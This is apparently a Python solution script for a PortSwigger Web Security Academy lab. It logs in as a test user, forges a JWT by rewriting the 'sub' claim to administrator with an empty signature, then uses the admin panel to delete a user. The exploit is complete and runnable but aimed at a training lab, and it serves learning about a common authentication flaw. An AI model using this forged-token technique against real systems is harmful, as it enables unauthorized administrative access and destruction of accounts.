"""
Lab 1: JWT authentication bypass via unverified signature
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature
Difficulty: Apprentice

📝 The flaw: the server decodes and trusts the JWT payload but never actually
verifies the signature against anything. We can edit the payload freely.

Goal: become admin, delete user carlos via /admin.
"""

from utils import get_session, log, note, decode_jwt, build_unverified_token

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
WIENER = {"username": "wiener", "password": "peter"}


def run():
    s = get_session()

    r = s.post(f"{TARGET}/login", data=WIENER)
    token = s.cookies.get("session")
    log(f"Got session token as wiener: {token}")

    header, payload = decode_jwt(token)
    note(f"Decoded payload: {payload}")

    payload["sub"] = "administrator"
    note("Changed 'sub' claim to administrator — no signature means no check.")

    forged = build_unverified_token(header, payload)  # signature left empty
    s.cookies.set("session", forged)

    r = s.get(f"{TARGET}/admin")
    if r.status_code == 200:
        log("Reached /admin as administrator.")
    else:
        log(f"/admin returned {r.status_code} — check claim name (sub vs username).", ok=False)
        return

    r = s.post(f"{TARGET}/admin/delete", params={"username": "carlos"})
    log(f"Delete carlos responded {r.status_code}")


if __name__ == "__main__":
    run()
